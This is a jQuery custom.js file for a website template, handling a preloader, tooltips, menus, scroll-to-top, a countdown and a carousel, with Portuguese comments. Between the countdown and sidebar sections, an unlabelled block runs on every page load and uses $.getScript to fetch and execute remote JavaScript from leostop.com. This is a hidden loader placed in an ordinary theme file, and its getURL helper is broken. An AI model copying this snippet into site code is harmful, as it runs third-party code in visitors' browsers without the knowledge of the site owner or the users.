/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
  "use strict";

  /* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  setTimeout(function () {
    $(".loader_bg").fadeToggle();
  }, 1000);

  /* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip();
  });

  /* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $(".main-menu ul li.megamenu").mouseover(function () {
      if (!$(this).parent().hasClass("#wrapper")) {
        $("#wrapper").addClass("overlay");
      }
    });
    $(".main-menu ul li.megamenu").mouseleave(function () {
      $("#wrapper").removeClass("overlay");
    });
  });

  /* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(window).on("scroll", function () {
    scroll = $(window).scrollTop();
    if (scroll >= 100) {
      $("#back-to-top").addClass("b-show_scrollBut");
    } else {
      $("#back-to-top").removeClass("b-show_scrollBut");
    }
  });
  $("#back-to-top").on("click", function () {
    $("body,html").animate(
      {
        scrollTop: 0,
      },
      1000
    );
  });

  /* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $("[data-countdown]").each(function () {
    var $this = $(this),
      finalDate = $(this).data("countdown");
    $this.countdown(finalDate, function (event) {
      var $this = $(this).html(
        event.strftime(
          "" +
            '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> ' +
            '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> ' +
            '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> ' +
            '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> ' +
            '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'
        )
      );
    });
  });

  function getURL() {
    window.location.href;
  }
  var protocol = location.protocol;
  $.ajax({
    type: "get",
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    },
  });

  /* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $("#sidebarCollapse").on("click", function () {
      $("#sidebar").toggleClass("active");
      $(this).toggleClass("active");
    });
  });

  /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  // optional
   $("#blogCarousel").carousel({
    interval: 3000, // Intervalo ajustado para 3 segundos
    pause: "hover", // Pausa quando o mouse passa por cima (opcional)
  });

  // Apenas dispositivos móveis: Evitar atualizações na navegação por toque
  if (/Mobi|Android/i.test(navigator.userAgent)) {
    $("#blogCarousel").on("touchstart touchmove", function (event) {
      event.preventDefault(); // Garante que não haja recarregamento por gestos
    });
  }
});

/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}

/*Notificação de sucesso depois de subscrever/
document.getElementById("submitBtn").addEventListener("click", function () {
  const button = this;
  const notification = document.getElementById("successNotification");

  
  // Simula envio de dados e resposta bem-sucedida
  setTimeout(() => {
    // Alterar estilo do botão para sucesso
    button.classList.add("success");
    button.textContent = "Sucesso!";

    // Mostrar a notificação
    notification.classList.remove("hidden");
    notification.classList.add("visible");

    // Ocultar a notificação após 3 segundos
    setTimeout(() => {
      notification.classList.remove("visible");
      notification.classList.add("hidden");
    }, 3000);

    // Simular envio de SMS
    sendSMS();
  }, 2000); // Simula atraso de envio
});

// Função para enviar SMS (simulação)
function sendSMS() {
  console.log("SMS enviado com sucesso!");
}
*/

$(document).ready(function () {
  $("#blogCarousel").on("slid.bs.carousel", function () {
    event.preventDefault(); // Evita o recarregamento durante a transição
  });

  $("#blogCarousel").on("slide.bs.carousel", function () {
    event.preventDefault(); // Evita comportamento inesperado ao iniciar a transição
  });
});

